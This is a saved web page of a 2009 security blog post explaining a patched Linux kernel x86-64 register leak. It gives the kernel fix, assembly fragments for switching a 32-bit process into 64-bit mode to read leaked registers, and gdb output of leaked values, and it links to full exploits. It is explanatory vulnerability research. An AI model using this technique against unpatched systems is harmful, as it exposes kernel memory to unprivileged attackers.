<!DOCTYPE html>
<!-- saved from url=(0076)https://jon.oberheide.org/blog/2009/10/04/linux-kernel-x86-64-register-leak/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta name="viewport" content="width=device-width,minimum-scale=1">
  <meta name="author" content="Jon Oberheide">
  <meta name="description" content="Jon Oberheide&#39;s website">

  <title>Linux Kernel x86-64 Register Leak | Jon Oberheide</title>
 
  
  
    <meta name="ROBOTS" content="INDEX, FOLLOW">

    
    <script async="" src="./2009 - Linux Kernel x86-64 Register Leak_files/js"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-P6TVZTTZN2');
    </script>
  

  <link rel="preconnect" href="https://fonts.gstatic.com/">
  <link href="./2009 - Linux Kernel x86-64 Register Leak_files/css2" rel="stylesheet">

  <link href="./2009 - Linux Kernel x86-64 Register Leak_files/style.css" rel="stylesheet">
  <link href="./2009 - Linux Kernel x86-64 Register Leak_files/fontawesome.css" rel="stylesheet">
  <link href="./2009 - Linux Kernel x86-64 Register Leak_files/brands.css" rel="stylesheet">

</head>

<body>
  <aside>
    <div id="user_meta">
      <a href="https://jon.oberheide.org/">
        <img src="./2009 - Linux Kernel x86-64 Register Leak_files/jono.jpg" alt="logo" id="logo">
      </a>
      <h2><a href="https://jon.oberheide.org/" class="nohover">Jon Oberheide</a></h2>
      
      <div class="social">
        <ul>
	  <li><a href="https://www.linkedin.com/in/jonoberheide">LinkedIn<i class="fab fa-linkedin fa-lg"></i></a></li>
	  <li><a href="https://twitter.com/jonoberheide">Twitter<i class="fab fa-twitter fa-lg"></i></a></li>  
	</ul>
      </div>
      <ul>
      </ul>
    </div>
  </aside>

  <main id="main">

    
    
    <header>
      <p id="header">
      <a href="https://jon.oberheide.org/">Home</a>
      | <a href="https://jon.oberheide.org/blog/">Blog</a>
      | <a href="https://jon.oberheide.org/research/">Research</a>
      | <a href="https://jon.oberheide.org/advisories/">Advisories</a>
      | <a href="https://jon.oberheide.org/projects/">Projects</a>
    </p></header>
    

    <article>
      <div class="article_title">
        <h1>Linux Kernel x86-64 Register Leak</h1>
        
        
        
        <h4>Sunday, October 4, 2009</h4>
        
      </div>

      <div class="article_text">
<p>A recent vulnerability in the Linux kernel (versions &lt;= 2.6.32-rc1)
allows the leakage of certain register contents. The x86-64 registers
r8-r11 may be leaked to 32-bit unprivileged userspace applications that
switch themselves into 64-bit mode.</p>
<h2 id="introduction">Introduction</h2>
<p>In order to understand this vulnerability, we first need to talk a bit
about the <a href="http://en.wikipedia.org/wiki/X86-64">x86-64 architecture</a>
(aka amd64). One of the key design decisions of x86-64, which fueled its
adoption over IA-64, is its backward compatibility with 32-bit code. In
x86-64 long mode, there are two sub-modes controlled by the code segment
descriptor: compatibility mode and 64-bit mode. Therefore, our 64-bit
operating system can execute both 32-bit and 64-bit binaries without
issue. Of course, if we're executing a 32-bit binary, we can access our
traditional 32-bit architecture registers and not any of the additional
register file added by x86-64.</p>
<p>However, it is possible to mix both 32-bit and 64-bit code within a
single executable. A 32-bit process can switch into 64-bit mode and jump
right to x86-64 machine code. In addition, a 64-bit process is capable
of invoking 32-bit syscalls. This type of switching can often be abused
to bypass syscall filtering mechanisms as Chris Evans
<a href="http://scary.beasts.org/security/CESA-2009-001.html">discovered</a> (since
syscall numbers differ between 32-bit and 64-bit). In this case, we will
switch between 32-bit and 64-bit code in order to exploit an information
leak in the kernel.</p>
<h2 id="the-vulnerability">The Vulnerability</h2>
<p>The underlying issue that causes this vulnerability is a lack of zeroing
out several of the x86-64 registers upon returning from a syscall. A
32-bit application may be able to switch to 64-bit mode and access the
r8, r9, r10, and r11 registers to leak their previous values. This issue
was <a href="http://lkml.org/lkml/2009/10/1/164">discovered</a> by Jan Beulich and
patched on October 1st. The fix is obviously to zero out these registers
to avoid leaking any information to userspace.</p>
<p>A snippet from the patch demonstrating the fix:</p>
<pre><code>diff --git a/arch/x86/ia32/ia32entry.S b/arch/x86/ia32/ia32entry.S
--- a/arch/x86/ia32/ia32entry.S
+++ b/arch/x86/ia32/ia32entry.S
@@ -172,6 +172,10 @@ sysexit_from_sys_call:
        movl    RIP-R11(%rsp),%edx              /* User %eip */
        CFI_REGISTER rip,rdx
        RESTORE_ARGS 1,24,1,1,1,1
+       xorq    %r8,%r8
+       xorq    %r9,%r9
+       xorq    %r10,%r10
+       xorq    %r11,%r11
        popfq
        CFI_ADJUST_CFA_OFFSET -8
        /*CFI_RESTORE rflags*/
</code></pre>
<h2 id="the-exploit">The Exploit</h2>
<p>As we previously mentioned, our 32-bit userspace application needs to
switch into 64-bit mode in order to access the x86-64 registers and
expose the leaked information. To mix our 32-bit and 64-bit code, we
compile our binary with -m32 but use gcc's inline asm to mix in the
necessary 64-bit code without conflict. In order to switch to 64-bit
mode, we simply need to perform a ljmp/lcall with the USER_CS code
segment (0x33 on Linux):</p>
<pre><code>.code32
ljmp $0x33, $1f
.code64
1:
/* 64-bit code here */
xorq %rax, %rax
...
</code></pre>
<p>For each of the 64-bit registers r8, r9, r10, and r11, we simply cram
the 64-bits into two 32-bit GPRs. For example, we throw the upper and
lower 32-bits of r8 into rax and rcx respectively (later to be retrieved
through eax and ecx):</p>
<pre><code>movq %r8, %rcx
shr $32, %r8
movq %r8, %rax
</code></pre>
<p>Finally, to retrieve the leaked values, we jmp to an invalid address
(0xdeadbeef) to cause a SIGSEGV and then use 'info regs' in gdb to
inspect the register values.</p>
<p>The full exploit is available <a href="https://jon.oberheide.org/blog/2009/10/04/linux-kernel-x86-64-register-leak/files/cve-2009-2910.c">here</a>. Example
output:</p>
<pre><code>$ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak
$ gdb ./x86_64-reg-leak
GNU gdb 6.8-debian
...
(gdb) run
[+] Switching to x86_64 long mode via far jmp...
...
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) info reg
eax            0xffff8800       -30720        &lt;-- r8 upper
ecx            0xa5cc6000       -1513332736   &lt;-- r8 lower
edx            0x0      0                     &lt;-- r9 upper
ebx            0x1      1                     &lt;-- r9 lower
esp            0xffff8800       0xffff8800    &lt;-- r10 upper
ebp            0xa5cc6000       0xa5cc6000    &lt;-- r10 lower
esi            0x0      0                     &lt;-- r11 upper
edi            0xffffffff       -1            &lt;-- r11 lower
...
</code></pre>
<p>spender also wrote an exploit simultaneously which is available
<a href="http://grsecurity.net/~spender/64bit_regleak.c">here</a>. It will loop and
call a bunch of random syscalls and printf the leaked data so you don't
have to use gdb.</p>


      </div>
    </article>

    <div id="ending_message">
      <p>Copyright Â© 2021 - Jon Oberheide</p>
    </div>

  </main>



</body></html>